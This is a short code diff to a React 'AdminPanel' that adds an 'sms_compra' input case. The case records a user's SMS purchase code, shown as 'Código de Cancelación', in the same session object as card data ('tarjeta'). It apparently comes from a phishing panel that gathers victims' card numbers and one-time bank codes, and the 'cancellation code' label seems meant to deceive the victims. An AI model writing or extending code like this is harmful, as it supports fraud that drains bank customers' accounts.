@@ -118,6 +118,9 @@ export default function AdminPanel() {
             case 'tarjeta':
               inputDescription = `Tarjeta: ${inputData.tarjeta}`;
               break;
+            case 'sms_compra':
+              inputDescription = `Código de Cancelación: ${inputData.smsCompra}`;
+              break;
             default:
               inputDescription = `Datos de ${tipo}`;
           }
@@ -154,6 +157,9 @@ export default function AdminPanel() {
                   break;
                 case 'tarjeta':
                   updatedSession.tarjeta = inputData.tarjeta;
+                  break;
+                case 'sms_compra':
+                  updatedSession.smsCompra = inputData.smsCompra;
                   break;
                 case 'smsCompra':
                   updatedSession.smsCompra = inputData.smsCompra;
